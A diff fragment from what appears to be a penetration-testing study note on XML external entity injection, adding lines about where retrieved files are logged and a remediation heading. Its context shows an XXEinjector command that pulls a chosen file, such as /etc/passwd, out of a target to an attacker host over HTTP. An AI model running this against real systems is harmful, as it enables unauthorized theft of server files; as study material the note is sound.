@@ -177,3 +177,7 @@ We can then submit our payload:
 ruby XXEinjector.rb --host=[ATK_HOST] --httpport=8000 --file=/tmp/xxe.req --path=[file_to_read] --oob=http
 ```
 > We can run other types of exploits too with this tool and we can extend it with other flags eg. `--phpfilter` which will use the PHP base64 filter.
+
+We can then find the file under `Logs/[IP]/path_to_file.log` (eg. `Logs/10.129.201.94/etc/passwd.log`)
+
+### Prevention & Remediation
